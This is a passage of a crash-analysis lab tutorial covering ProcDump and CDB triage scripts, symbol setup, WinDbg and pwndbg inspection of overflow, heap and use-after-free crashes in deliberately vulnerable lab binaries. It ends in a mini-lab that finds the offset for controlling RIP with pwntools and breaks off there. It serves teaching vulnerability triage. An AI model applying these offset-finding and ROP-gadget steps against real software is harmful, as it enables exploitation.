**Advanced ProcDump Usage**:

```bash
cd C:\CrashAnalysisLab

# Capture on first-chance exceptions (catches more bugs)
procdump -ma -e 1 -x dumps vuln_win.exe 1 AAAA...

# Capture on specific exception codes
procdump -ma -e 1 -f C0000005 -x dumps vuln_win.exe 5 0   # Access violation (NULL deref)

# Capture multiple dumps (for intermittent crashes)
procdump -ma -e -n 5 -x dumps vuln_win.exe 3   # UAF - capture up to 5 dumps

# Monitor service (generic example)
# procdump -ma -e -x C:\Dumps -w ServiceName.exe
```

**ProcDump + Fuzzing Integration**:

```bash
# Monitor fuzzing target (generic example)
# procdump -ma -e -x C:\FuzzDumps -accepteula target.exe @@

# Batch process dumps from fuzzing run
# for %d in (C:\CrashAnalysisLab\dumps\*.dmp) do cdb -z "%d" -c "!analyze -v; q" >> analysis.txt
```

#### Batch Dump Triage with CDB

Analyze multiple dumps automatically:

```bash
# Set CDB path (adjust version number as needed)
set CDB="C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe"

# Single dump analysis (use actual dump from ProcDump)
%CDB% -z C:\CrashAnalysisLab\dumps\vuln_win.exe_XXXXXX.dmp

# Or if cdb is in PATH:
cdb -z C:\CrashAnalysisLab\dumps\vuln_win.exe_XXXXXX.dmp -c "!analyze -v; q"
```

**Batch triage script** (batch_triage.cmd):

```bash
@echo off
# Set path to cdb.exe (adjust if needed)
set CDB="C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe"

for %%f in (C:\CrashAnalysisLab\dumps\*.dmp) do (
    echo ======================================== >> triage_report.txt
    echo Analyzing: %%f >> triage_report.txt
    echo ======================================== >> triage_report.txt
    %CDB% -z "%%f" -c ".symfix; .reload; !analyze -v; q" >> triage_report.txt 2>&1
)
echo Done! Results in triage_report.txt
```

**PowerShell Batch Analysis**:

```bash
# batch_analyze.ps1

# Path to cdb.exe - adjust if your Windows SDK version differs
$cdb = "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe"

# Verify cdb exists
if (-not (Test-Path $cdb)) {
    Write-Error "cdb.exe not found at $cdb. Install Windows SDK Debugging Tools."
    exit 1
}

$dumps = Get-ChildItem "C:\CrashAnalysisLab\dumps\*.dmp"
$results = @()

foreach ($dump in $dumps) {
    Write-Host "Analyzing $($dump.Name)..."

    $output = & $cdb -z $dump.FullName -c "!analyze -v; !exploitable; q" 2>&1 | Out-String

    # Extract key info
    $exploitable = if ($output -match "Exploitability Classification: (\w+)") { $Matches[1] } else { "Unknown" }
    $bugcheck = if ($output -match "EXCEPTION_CODE: \(NTSTATUS\) (0x[0-9a-f]+)") { $Matches[1] } else { "Unknown" }

    $results += [PSCustomObject]@{
        DumpFile = $dump.Name
        Exploitability = $exploitable
        ExceptionCode = $bugcheck
    }
}

$results | Export-Csv "triage_results.csv" -NoTypeInformation
$results | Format-Table -AutoSize
```

### Symbols and Symbolization (Linux Quick Reference)

Meaningful backtraces (GDB, CASR, ASAN reports) require symbols.

**1. Build with debug info (preferred for labs)**:

```bash
cd ~/crash_analysis_lab/src
sudo apt install -y clang-18 clang-18-dbgsym
clang -g -O1 -fno-omit-frame-pointer vulnerable_suite.c -o ../target
```

**2. Install debug symbols for system libraries (real-world targets)**:

```bash
# Ubuntu/Debian: prefer -dbg packages when available (example: libc6-dbg).
# Some packages ship -dbgsym via Ubuntu's ddebs repository.

# Fedora/RHEL:
# sudo dnf debuginfo-install glibc
```

**3. Use debuginfod for "fetch symbols on demand" (when local symbols unavailable)**:

```bash
# Set URL for your distribution (GDB/LLDB will auto-fetch symbols)
# Ubuntu:
export DEBUGINFOD_URLS="https://debuginfod.ubuntu.com"
# Fedora:
# export DEBUGINFOD_URLS="https://debuginfod.fedoraproject.org"
# Generic fallback:
# export DEBUGINFOD_URLS="https://debuginfod.elfutils.org/"

# Note: If you install -dbgsym packages locally (recommended),
# GDB uses those directly without needing debuginfod.
```

**4. Symbolize raw addresses when you only have PCs**:

```bash
sudo apt install -y elfutils binutils
cd ~/crash_analysis_lab

# IMPORTANT: Full source info requires debug symbols (-g flag at compile time)
# Verify with: file ./target  (look for "with debug_info, not stripped")

# Find function addresses in your binary
nm ./target | grep -E " T " | head -5
# Example output:
# 00000000000012b0 T double_free
# 0000000000001624 T _fini
# 00000000000011e0 T heap_overflow
# 0000000000001000 T _init
# 00000000000013c0 T main

# Symbolize using an address from nm output or a crash backtrace
# (PIE binaries show low addresses; add the runtime base for live processes)
addr2line -e ./target -f -C 0x12b0
# With debug info (-g at compile time):
#   double_free
#   /home/dev/crash_analysis_lab/src/vulnerable_suite.c:37
#
# Without debug info, you only get the function name:
#   double_free
#   ??:0

# NOTE: eu-addr2line (from elfutils) may show ??:0 even with debug info
# due to DWARF5 compatibility issues. Prefer addr2line (from binutils).
# eu-addr2line -e ./target -f -C 0x12b0  # May not resolve line numbers

# Dynamic lookup example:
addr2line -e ./target -f -C $(nm ./target | grep " T main" | awk '{print $1}')
```

### Symbol Hygiene Best Practices

- Symbols make or break crash analysis.
- Without them, you're staring at hex addresses instead of function names.
- This section provides best practices for both Windows and Linux.

#### Linux Symbol Management

**1. debuginfod (Automatic Symbol Fetching)**:

debuginfod can automatically fetch debug symbols on-demand from public servers when you don't have them installed locally.

```bash
# Install debuginfod client
sudo apt install debuginfod

# Configure debuginfod URL for your distribution
# Ubuntu:
export DEBUGINFOD_URLS="https://debuginfod.ubuntu.com"
# Fedora:
# export DEBUGINFOD_URLS="https://debuginfod.fedoraproject.org"
# Arch:
# export DEBUGINFOD_URLS="https://debuginfod.archlinux.org"

# For GDB, enable automatic fetching
echo "set debuginfod enabled on" >> ~/.gdbinit

# For LLDB
export LLDB_DEBUGINFOD_URLS="https://debuginfod.elfutils.org/"
```

> [!IMPORTANT]
> **debuginfod vs local debug packages**: debuginfod queries _remote_ servers for symbols you don't have locally.
> If you install debug symbol packages (e.g., `coreutils-dbgsym`), the symbols are stored locally at `/usr/lib/debug/` and GDB uses them directly without needing debuginfod.

**Verification**: Don't use `debuginfod-find` to verify your setup—it only queries remote servers. Instead, verify GDB can find symbols:

```bash
# Install local debug symbols (recommended for common packages)
sudo apt install coreutils-dbgsym

# Verify GDB finds the symbols
gdb -q -ex "file /usr/bin/ls" -ex "info sources" -ex "quit" 2>&1 | head -5
# Expected output (with pwndbg you'll see its banner first, then):
#   Reading symbols from /usr/bin/ls...
#   Reading symbols from /usr/lib/debug/.build-id/xx/xxxxx.debug...
#   ... followed by source file paths like ls.c, hash.c, etc.
```

**When to use debuginfod**: debuginfod is useful when you're analyzing crashes in binaries where you _haven't_ installed the `-dbgsym` package.
GDB will automatically fetch symbols from the configured server.

**2. Installing Debug Symbol Packages**:

```bash
sudo apt install libc6-dbgsym           # Common libraries
sudo apt install libssl3t64-dbgsym      # OpenSSL (Ubuntu 24.04+)
sudo apt install zlib1g-dbgsym          # zlib

# For -dbgsym packages (automatically generated):
# Enable ddebs repository first:
#echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse" | \
#    sudo tee /etc/apt/sources.list.d/ddebs.list
#sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys F2EDC64DC5AEE1F6B9C621F0C8CAB6595FDFF622
#sudo apt update
#sudo apt install package-dbgsym
```

**3. Symbolizing Addresses with addr2line**:

```bash
# addr2line (from binutils) is preferred for symbolization
# NOTE: eu-addr2line (from elfutils) may show ??:0 even with debug info
# due to DWARF5 compatibility issues. Prefer addr2line.

# IMPORTANT: ASAN reports are ALREADY SYMBOLIZED!
# If your ASAN output shows:
#   #0 0x59cc1877a53e in use_after_free src/vulnerable_suite.c:33
# The file:line info (src/vulnerable_suite.c:33) is already there!
# You do NOT need to run addr2line on ASAN output.
#
# addr2line is only needed for:
# - Raw core dumps without ASAN
# - Stripped binaries with separate debug info
# - Non-ASAN crash logs that only show addresses
#
# If ASAN output shows "??:0" instead of file:line, fix symbolization:
#   sudo apt install llvm
#   export ASAN_SYMBOLIZER_PATH=$(which llvm-symbolizer)
#   # Then re-run the crash

# For non-ASAN crashes, use STATIC addresses from nm (not runtime addresses):
# Runtime addresses like 0x59cc1877a53e include PIE base and won't work!
nm ./vuln_asan | grep "T use_after_free"
# Output: 00000000000014a3 T use_after_free

# Use the static address with addr2line:
addr2line -e ./vuln_asan -f -C 0x14a3
# Output:
#   use_after_free
#   /home/dev/crash_analysis_lab/src/vulnerable_suite.c:27

# addr2line options:
# -f: Show function names
# -C: Demangle C++ symbols
# -i: Show inlined functions

# Example: Look up a function by name and symbolize it
addr2line -e ./vuln_asan -f -C $(nm ./vuln_asan | grep "T print_usage" | awk '{print $1}')

# To convert runtime address to static (for PIE binaries):
# 1. Get the binary's load base from /proc/<pid>/maps or ASAN output
# 2. Subtract base from runtime address
# Example: If base is 0x59cc18779000 and crash addr is 0x59cc1877a53e:
#   Static offset = 0x59cc1877a53e - 0x59cc18779000 = 0x153e
#   addr2line -e ./vuln_asan -f -C 0x153e

# With debuginfod (for system binaries without local debug packages):
DEBUGINFOD_URLS="https://debuginfod.ubuntu.com" \
    addr2line -e /usr/bin/crashed_binary -f -C 0x12345
```

**4. Verifying Symbol Quality**:

```bash
# Check if binary has debug symbols
file target
# Look for: "with debug_info, not stripped"

# Check symbol table size
nm target | wc -l

# Check DWARF info presence
readelf --debug-dump=info target | head -50

# Verify specific function is symbolized
nm target | grep stack_overflow
```

#### Windows Symbol Management

**1. Configuring \_NT_SYMBOL_PATH**:

```bash
# Set symbol path permanently (user environment)
setx _NT_SYMBOL_PATH "srv*C:\Symbols*https://msdl.microsoft.com/download/symbols"

# Or in current session
set _NT_SYMBOL_PATH=srv*C:\Symbols*https://msdl.microsoft.com/download/symbols

# Multiple symbol sources (local + Microsoft + custom server)
set _NT_SYMBOL_PATH=C:\MySymbols;srv*C:\Symbols*https://msdl.microsoft.com/download/symbols;srv*C:\ThirdParty*https://symbols.example.com/
```

**2. WinDbg Symbol Commands**:

```bash
# open C:\CrashAnalysisLab\vuln_win.exe in windbg
# Quick setup for Microsoft symbols
.symfix C:\Symbols
# Add additional symbol path
.sympath+ C:\CrashAnalysisLab
.reload

# Show current symbol path
.sympath

# Force reload all symbols
.reload /f

# Reload specific module
# .reload /f ntdll.dll

# Enable verbose symbol loading (debugging symbol issues)
!sym noisy
.reload /f

# Disable noisy mode when done
!sym quiet

# Check symbol status for module
lm m ntdll
# Look for: "pdb symbols" vs "export symbols" vs "no symbols"

# Verify specific symbol loads
x ntdll!Rtl*    # List all Rtl* functions - only works with symbols
```

**3. Troubleshooting Symbol Issues**:

```bash
# Symbol loading failed? Check these:
!sym noisy
.reload /f vuln_win.exe

# Common issues:
# 1. Symbol server timeout → Use local cache
# 2. PDB mismatch → Check build matches binary
# 3. Private symbols missing → Request from vendor

# Verify PDB matches binary
!lmi target
# Check: "Checksum" matches between .exe and .pdb

# Force load unverified symbols (use with caution)
.symopt+ 0x40     # SYMOPT_LOAD_ANYTHING
.reload /f
.symopt- 0x40     # Disable after
```

#### Cross-Platform Symbol Checklist

- Linux
  - [ ] debuginfod URL configured
  - [ ] Debug packages installed for target libraries
  - [ ] Binary built with -g flag
  - [ ] eu-addr2line available for batch symbolization
- Windows
  - [ ] `_NT_SYMBOL_PATH` environment variable set
  - [ ] Symbol cache directory exists and writable
  - [ ] Microsoft symbol server accessible
  - [ ] PDB files match target binaries (same build)
- Both Platforms
  - [ ] Third-party library symbols obtained
  - [ ] Symbol server accessible (or offline cache populated)
  - [ ] Test symbolization: verify backtrace shows function names

### Analyzing Crash in Pwndbg

```bash
# Load core dump
# If you have a local core file (e.g., from core_pattern writing to CWD):
cd ~/crash_analysis_lab
# run it against Test 1 in line 564
gdb ./vuln_no_protect -c /var/crash/core.vuln_no_protect.1184.1766232655
#Reading symbols from ./vuln_no_protect...
#[New LWP 1184]
#[Thread debugging using libthread_db enabled]
#Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
#Core was generated by `./vuln_no_protect 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
#Program terminated with signal SIGSEGV, Segmentation fault.
##0  0x4141414141414141 in ?? ()
#------- tip of the day (disable with set show-tips off) -------
#GDB and Pwndbg parameters can be shown or set with show <param> and set <param> <value> GDB commands
#LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
#──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]#───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# RAX  0xd5
# RBX  0x7ffcc3436ea8 —▸ 0x7ffcc343748f ◂— './vuln_no_protect'
# RCX  0
# RDX  0
# RDI  0x7ffcc3436b20 —▸ 0x7ffcc3436b50 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH'
# RSI  0xee2e2a0 ◂— 0x66667542205d2a5b ('[*] Buff')
# R8   0
# R9   0
# R10  0xffffffff
# R11  0x202
# R12  3
# R13  0
# R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
# R15  0x74e4537e6000 (_rtld_global) —▸ 0x74e4537e72e0 ◂— 0
# RBP  0x4141414141414141 ('AAAAAAAA')
# RSP  0x7ffcc3436d60 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
# RIP  0x4141414141414141 ('AAAAAAAA')
#───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]#────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
#Invalid address 0x4141414141414141
#─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]#─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
#00:0000│ rsp 0x7ffcc3436d60 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
#... ↓        7 skipped
#───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]#───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# ► 0 0x4141414141414141 None
#   1 0x4141414141414141 None
#   2 0x4141414141414141 None
#   3 0x4141414141414141 None
#   4 0x4141414141414141 None
#   5 0x4141414141414141 None
#   6 0x4141414141414141 None
#   7 0x4141414141414141 None

pwndbg> print $_siginfo
#$1 = {
#  si_signo = 11,
#  si_errno = 0,
#  si_code = 1,
#  _sifields = {
#    _pad = {1094795585, 1094795585, 0 <repeats 26 times>},
#    _kill = {
#      si_pid = 1094795585,
#      si_uid = 1094795585
#    },
#    _timer = {
#      si_tid = 1094795585,
#      si_overrun = 1094795585,
#      si_sigval = {
#        sival_int = 0,
#        sival_ptr = 0x0
#      }
#    },
#   ...
#
# Key fields:
# - si_signo = 11 → SIGSEGV
# - si_code = 1 → SEGV_MAPERR (address not mapped to object)
# - si_code = 2 → SEGV_ACCERR (invalid permissions, e.g., NX violation)
# - _sigfault.si_addr → The address that caused the fault
#
# This confirms: Control flow hijack - CPU tried to execute at invalid address 0x4141...

# Check stack for overflow pattern
pwndbg> telescope $rsp 30
#00:0000│ rsp 0x7ffcc3436d60 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
#... ↓        14 skipped
#0f:0078│     0x7ffcc3436dd8 —▸ 0x74e4537e6000 (_rtld_global) —▸ 0x74e4537e72e0 ◂— 0
#10:0080│     0x7ffcc3436de0 ◂— 0xdd1f52d83d3c0cb0
#11:0088│     0x7ffcc3436de8 ◂— 0xcb2e72dba51e0cb0
#12:0090│     0x7ffcc3436df0 ◂— 0x7ffc00000000
#13:0098│     0x7ffcc3436df8 ◂— 0
#14:00a0│     0x7ffcc3436e00 ◂— 0
#15:00a8│     0x7ffcc3436e08 ◂— 3
#16:00b0│     0x7ffcc3436e10 —▸ 0x7ffcc3436ea0 ◂— 3
#17:00b8│     0x7ffcc3436e18 ◂— 0xa20d707b5eb54d00
#18:00c0│     0x7ffcc3436e20 —▸ 0x7ffcc3436e80 ◂— 0
#19:00c8│     0x7ffcc3436e28 —▸ 0x74e45342a28b (__libc_start_main+139) ◂— mov r15, qword ptr [rip + 0x1d8cf6]
#1a:00d0│     0x7ffcc3436e30 —▸ 0x7ffcc3436ec8 —▸ 0x7ffcc343756c ◂— 'SHELL=/bin/bash'
#1b:00d8│     0x7ffcc3436e38 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
#1c:00e0│     0x7ffcc3436e40 —▸ 0x7ffcc3436ec8 —▸ 0x7ffcc343756c ◂— 'SHELL=/bin/bash'
#1d:00e8│     0x7ffcc3436e48 —▸ 0x401485 (main) ◂— endbr64
```

### WinDbg User Interface Overview

**Command Window**: Type commands here
**Registers Window**: View CPU register state
**Disassembly Window**: View assembly code at current IP
**Memory Window**: Inspect memory contents
**Call Stack Window**: View function call hierarchy
**Locals/Watch Window**: Inspect variables

**Essential Keyboard Shortcuts**:

- `F5`: Go (continue execution)
- `F10`: Step over
- `F11`: Step into
- `Shift+F9`: Set/remove breakpoint
- `Shift+F11`: Step out
- `Ctrl+Break`: Break into debugger

### Analyzing Stack Buffer Overflow Crashes

**Crash Scenario**: Stack buffer overflow in vulnerable application

**Load Crash Dump**:

```bash
# Open crash dump file
File → Open Dump file → select C:\CrashAnalysisLab\dumps\xxx.dmp (or one of the crashes from linux)

# Or from command line
cd C:\CrashAnalysisLab\dumps
windbg -z xxx.dmp

# Verify dump loaded
!analyze -v
#FILE_IN_CAB:  vuln_win.exe_260105_151715.dmp
#COMMENT:
#*** procdump  -ma -e -x dumps vuln_win.exe 1 #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#AAAAAAAAAA
#*** Unhandled exception: C0000005.ACCESS_VIOLATION
#NTGLOBALFLAG:  70
#APPLICATION_VERIFIER_FLAGS:  0
#CONTEXT:  (.ecxr)
#rax=00000000000000d7 rbx=000000000052e6b0 rcx=0000000000000000
#rdx=0000000000010000 rsi=0000000000000000 rdi=00000000005342d0
#rip=000000014000744a rsp=000000000014fed8 rbp=0000000000000000
# r8=7ffffffffffffffc  r9=0000000000000000 r10=0000000000000000
#r11=000000000014fcd0 r12=0000000000000000 r13=0000000000000000
#r14=0000000000000000 r15=0000000000000000
#iopl=0         nv up ei pl nz na po nc
#cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010204
#vuln_win!stack_overflow+0x3a:
#00000001`4000744a c3              ret
#Resetting default scope
#EXCEPTION_RECORD:  (.exr -1)
#ExceptionAddress: 000000014000744a (vuln_win!stack_overflow+0x000000000000003a)
#   ExceptionCode: c0000005 (Access violation)
#  ExceptionFlags: 00000000
#NumberParameters: 2
#   Parameter[0]: 0000000000000000
#   Parameter[1]: ffffffffffffffff
#Attempt to read from address ffffffffffffffff
#PROCESS_NAME:  vuln_win.exe
#READ_ADDRESS:  ffffffffffffffff
#ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
#EXCEPTION_CODE_STR:  c0000005
#EXCEPTION_PARAMETER1:  0000000000000000
#EXCEPTION_PARAMETER2:  ffffffffffffffff
#IP_ON_HEAP:  4141414141414141
#The fault address in not in any loaded module, please check your build's rebase
#log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may
#contain the address if it were loaded.
```

**Initial Analysis Commands**:

```bash
# Show registers at crash
r

# Display call stack
k
kv      # Verbose with frame pointer
kP      # With full source paths (if symbols loaded)
kn      # With frame numbers

# Show current instruction
u @rip
u @rip L10    # Disassemble 10 instructions

# Examine stack
dps @rsp
dps @rsp L50  # Display 50 pointer-sized values
```

### Analyzing Heap Corruption Crashes

Using the `vuln_win.exe` test suite from the "Building a Windows Vulnerable Test Suite" section, generate heap-related crashes:

```bash
# Generate heap overflow crash (Test 2)
cd C:\CrashAnalysisLab
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable vuln_win.exe /full
vuln_win.exe 2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#AAAAAAAAAA
# Crash dump saved to C:\CrashDumps\vuln_win.exe.<PID>.dmp

# Generate use-after-free crash (Test 3)
vuln_win.exe 3
# May not crash without PageHeap - see PageHeap lab below

# Generate double-free crash (Test 4)
vuln_win.exe 4
# May not crash without PageHeap - see PageHeap lab below
```

**Load and Analyze Heap Overflow Dump**:

```bash
# open dump! via GUI: File → Open Crash Dump → select the .dmp file

# Initial analysis
0:000> !analyze -v
# Look for: EXCEPTION_CODE: c0000005 (Access violation)
# Look for: heap_overflow or HeapFree in the stack
```

**Heap Metadata Corruption Pattern** (typical output):

```bash
# Crash often occurs in HeapFree or subsequent allocation
0:000> k
# ntdll!RtlUserThreadStart$filt$0+0x3f
# ntdll!_C_specific_handler+0x93
# ntdll!RtlpExecuteHandlerForException+0xf
# ntdll!RtlDispatchException+0x437
# ntdll!KiUserExceptionDispatch+0x2e
# vuln_win!__entry_from_strcat_in_strcpy+0x1f
# vuln_win!heap_overflow+0x45
# vuln_win!main+0xdb

# Check heap state
0:000> !heap -s                    # Summary of all heaps
0:000> !heap -a 0                  # Analyze default process heap

# Check what was the destination buffer
0:000> dq @rdx L8

# See how far past the buffer you wrote(WRITE_ADDRESS from !analyze -v)
0:000> !address 0x01fac000

# Examine the vulnerable function
0:000> uf vuln_win!heap_overflow

# Check source if symbols are good
0:000> lsa vuln_win!heap_overflow
```

**Identifying UAF with vuln_win.exe**:

```bash
# First, enable PageHeap for better UAF detection (run as Administrator)
#cd C:\CrashAnalysisLab
#"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable /full vuln_win.exe

# Now run the UAF test (Test 3)
vuln_win.exe 3
# With PageHeap, this will crash immediately on UAF access

# Load the crash dump
windbg -z C:\CrashDumps\vuln_win.exe.<PID>.dmp

0:000> !analyze -v
# Typical UAF crash pattern
0:000> k
 # ChildEBP RetAddr
 # 00 ntdll!RtlpLowFragHeapFree+0x42
 # 01 vuln_win!use_after_free+0x15
 # 02 vuln_win!main+0x89

# Check if address was recently freed (requires PageHeap) -(READ_ADDRESS)
0:000> !heap -p -a 0x01fabfc0
    address 0000000001fabfc0 found in
    _DPH_HEAP_ROOT @ 1c01000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    1c0c820:          1fab000             2000
    00007ffd1074b2d3 ntdll!RtlDebugFreeHeap+0x0000000000000037
    00007ffd106e370c ntdll!RtlpFreeHeap+0x000000000000178c
    00007ffd10739300 ntdll!RtlFreeHeap+0x0000000000000620
    000000014000753d vuln_win!use_after_free+0x000000000000005d

# Don't forget to disable PageHeap after analysis
#"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /disable vuln_win.exe
```

**Classification**: Use-After-Free - object accessed after being freed.

### Common Crash Patterns and Identification

**1. Null Pointer Dereference**:

```bash
0:000> r rax
rax=0000000000000000

0:000> u @rip
mov  qword ptr [rax], rcx    # Writing to NULL

# Usually not exploitable unless kernel-mode
```

**2. Access Violation (Invalid Address)**:

```bash
0:000> r rax
rax=deadbeefdeadbeef         # Invalid address

# Could be:
# - Uninitialized pointer
# - Freed memory
# - Corrupted pointer
```

**3. Stack Cookie Violation**:

```bash
0:000> k
ntdll!RtlReportCriticalFailure
ntdll!RtlpReportHeapFailure
<Application>!__security_check_cookie
<Application>!function_with_stack_cookie

# Stack overflow detected, but mitigated by /GS
```

**4. Heap Corruption Detected**:

```bash
0:000> k
ntdll!RtlReportCriticalFailure
ntdll!RtlpHeapHandleError
ntdll!RtlpLogHeapFailure

# Heap allocator detected corruption
# Check nearby allocations for overflow source
```

### Essential WinDbg Commands Reference

**Memory Examination**:

```bash
db <address>           # Display bytes
dw <address>           # Display words (2 bytes)
dd <address>           # Display dwords (4 bytes)
dq <address>           # Display qwords (8 bytes)
da <address>           # Display ASCII string
du <address>           # Display Unicode string
dps <address>          # Display pointer-sized values with symbols
```

**Disassembly**:

```bash
u <address>            # Unassemble at address
u <address> L<count>   # Unassemble count instructions
ub <address>           # Unassemble backward
uf <function>          # Unassemble entire function
```

**Breakpoints**:

```bash
bp <address>           # Set breakpoint
bp <module>!<function> # Set breakpoint on function
ba r 1 <address>       # Hardware breakpoint on read
ba w 4 <address>       # Hardware breakpoint on write (4 bytes)
bl                     # List breakpoints
bc *                   # Clear all breakpoints
```

**Execution Control**:

```bash
g                      # Go (continue)
p                      # Step over
t                      # Step into (trace)
pt                     # Step to next return
pc                     # Step to next call
gu                     # Go up (step out)
```

**Searching Memory**:

```bash
s -a 0 L?80000000 "string"     # Search for ASCII string
s -u 0 L?80000000 "string"     # Search for Unicode string
s -b 0 L?80000000 41 41 41 41  # Search for bytes (hex)
```

**Modules and Symbols**:

```bash
lm                     # List loaded modules
lm m <module>          # Show specific module
x <module>!<symbol>    # Examine symbols
dt <structure>         # Display type (struct definition)
dt <structure> <addr>  # Display structure at address
```

**Heap Commands**:

```bash
!heap                  # List all heaps
!heap -s               # Heap summary
!heap -a <address>     # Analyze heap at address
!heap -p -a <address>  # Page heap info for allocation
!heap -x <address>     # Search heaps for address
```

**Linux (Pwndbg Equivalents)**:

```text
| WinDbg Command | Pwndbg Equivalent                 | Description           |
| -------------- | --------------------------------- | --------------------- |
| `db/dd/dq`     | `x/b`, `x/w`, `x/g` or `hexdump`  | Memory display        |
| `dps`          | `telescope`                       | Smart pointer display |
| `u`            | `x/i` or `disassemble`            | Disassembly           |
| `bp`           | `break` or `b`                    | Set breakpoint        |
| `ba w`         | `watch` or `rwatch`               | Hardware watchpoint   |
| `g`            | `continue` or `c`                 | Continue execution    |
| `p`            | `next` or `n`                     | Step over             |
| `t`            | `step` or `s`                     | Step into             |
| `s -a`         | `search "string"`                 | Search memory         |
| `lm`           | `info shared` or `vmmap`          | List modules          |
| `!heap`        | `heap`, `bins`, `arena`           | Heap analysis         |
| `!analyze -v`  | `bt`, `info registers`, `context` | Crash analysis        |
```

### Pwndbg Crash Analysis Commands

**Essential Pwndbg Commands for Crash Analysis**:

```bash
# Start GDB with crash dump
gdb ./target -c core.dump

# Or attach to process
gdb -p <pid>

# Load crash core with pwndbg
pwndbg> # Pwndbg automatically shows context on stop

# Display full context (registers, stack, code, backtrace)
pwndbg> context

# Examine registers
pwndbg> regs
pwndbg> info registers

# Backtrace
pwndbg> bt
pwndbg> bt full

# Memory examination (smart pointer display)
pwndbg> telescope $rsp 20
pwndbg> telescope $rsp 50

# Hexdump
pwndbg> hexdump $rax 64
pwndbg> hexdump 0x7fffffff0000 128

# Memory map
pwndbg> vmmap
pwndbg> vmmap libc

# Check binary protections
pwndbg> checksec

# Search memory
pwndbg> search "AAAA"
pwndbg> search -t qword 0x4141414141414141
pwndbg> search -x "deadbeef"

# Heap analysis (critical for heap bugs)
pwndbg> heap
pwndbg> bins
pwndbg> fastbins
pwndbg> tcache
pwndbg> vis_heap_chunks

# Disassembly
pwndbg> disassemble $rip
pwndbg> nearpc 20

# Find ROP gadgets
pwndbg> rop --grep "pop rdi"

# Cyclic pattern (for offset finding)
pwndbg> cyclic 200
pwndbg> cyclic -l 0x61616174
```

**Stack Overflow Offset Mini-Lab**

This mini-lab teaches you to find the exact offset needed to control RIP:

```bash
# Step 1: Generate a cyclic pattern (de Bruijn sequence)
cd ~/crash_analysis_lab
python3 -m venv .venv
source .venv/bin/activate
pip install pwntools
python3 -c 'from pwn import *; print(cyclic(200).decode())' > pattern.txt
cat pattern.txt
# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa...

# Step 2: Crash the program with the pattern
./vuln_no_protect 1 "$(cat pattern.txt)"
# Segmentation fault (core dumped)

# Step 3: Analyze the crash in GDB/Pwndbg (use the correct crash file- cwd or proper location)
gdb ./vuln_no_protect -c /var/crash/core.vuln_no_protect.3441.1766236363
pwndbg> info reg rip rbp
# rip            0x6161617461616173  0x6161617461616173
# rbp            0x6161617261616171  0x6161617261616171

# Step 4: Find the offset using the pattern in RIP
pwndbg> cyclic -n 4 -l 0x61616173
# Finding cyclic pattern of 4 bytes: b'saaa' (hex: 0x73616161)
# Found at offset 72

# Or using pwntools directly:
python3 -c "from pwn import *; print(cyclic_find(0x61616173))"
# 72

# Step 5: Verify control - overwrite RIP with a known value
python3 << 'EOF'
from pwn import *
